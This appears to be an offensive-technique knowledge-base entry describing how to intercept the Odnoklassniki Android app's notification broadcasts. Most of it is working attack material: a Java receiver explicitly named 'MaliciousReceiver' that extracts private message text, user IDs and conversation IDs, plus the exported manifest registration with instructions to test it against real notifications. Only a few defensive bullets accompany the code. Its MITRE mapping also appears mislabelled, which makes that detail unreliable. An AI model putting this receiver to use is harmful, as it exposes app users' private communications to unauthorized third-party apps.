---
tags:
  - android
  - broadcast-receiver
  - privacy-violation
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/implement-malicious-receiver]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1417]]'
updated_at: '2025-12-14T17:24:42.375Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 19e306d3-83b2-4b88-a734-37feeeb6747a
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[T1417]]'
---
# Intercept Unauthorized Notifications

## Summary

This procedure registers a malicious BroadcastReceiver to capture implicit intents sent by the Odnoklassniki app for notifications, extracting sensitive details like messages, user IDs, and conversation IDs without authorization.

## Description

Due to lack of permissions on notification intents in AndroidManifest.xml, any app can register a receiver for the action. When Odnoklassniki broadcasts notifications, the malicious receiver intercepts the extras bundle, logging or displaying private data. This enables privacy breaches by capturing real-time app communications.

## Requirements

1. Android device with Odnoklassniki active and sending notifications
2. Malicious app with receiver registration in manifest or dynamic
3. Permissions for broadcast reception

## Defense

Defensive measures and detection strategies:

- Use custom or signature permissions for sensitive broadcast actions
- Export receivers only if necessary and validate senders
- Detect duplicate receivers via system logs or app introspection

## Objectives

1. Register receiver for notification action
2. Capture and extract intent extras
3. Log sensitive data for analysis

## Instructions

### Step 1: Implement Malicious Receiver Class

**Context**: Extend BroadcastReceiver to handle the notification action and parse extras.

**Command** ([[commands/implement-malicious-receiver]]):
```java
public class MaliciousReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if ("ru.ok.android.action.NOTIFY".equals(intent.getAction())) { Bundle localBundle = intent.getExtras(); if (localBundle != null) { String str1 = localBundle.getString("key"); String str2 = localBundle.getString("message"); String str3 = localBundle.getString("cid"); if (str3 != null) { String str4 = localBundle.getString("caller_name"); String str5 = localBundle.getString("server"); return; } String str4 = localBundle.getString("nconversation_id"); String str5 = localBundle.getString("dsc_id"); Toast.makeText(context, "key:" + str1 + "\nmessage: " + str2 + "\ncid: " + str3 + "\nconversation_id: " + str4 + "\ndsc_id: " + str5, Toast.LENGTH_SHORT).show(); } } } }
```

> Checks action, gets extras, extracts strings for key, message, etc., and displays via Toast. Expected output: Toast with intercepted data.

### Step 2: Register Receiver

**Context**: Add to AndroidManifest.xml or register dynamically in code.

**Command** (Manifest entry):
```xml
<receiver android:name=".MaliciousReceiver" android:exported="true">
    <intent-filter>
        <action android:name="ru.ok.android.action.NOTIFY" />
    </intent-filter>
</receiver>
```

> Enables reception of broadcasts. Trigger a real notification in Odnoklassniki to test.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[T1417]] Hijack Execution Flow

### Sub-Techniques

-

## Commands Used

- [[commands/implement-malicious-receiver]]

## Tools Used

-

## Tags

- android
- broadcast-receiver
- privacy-violation
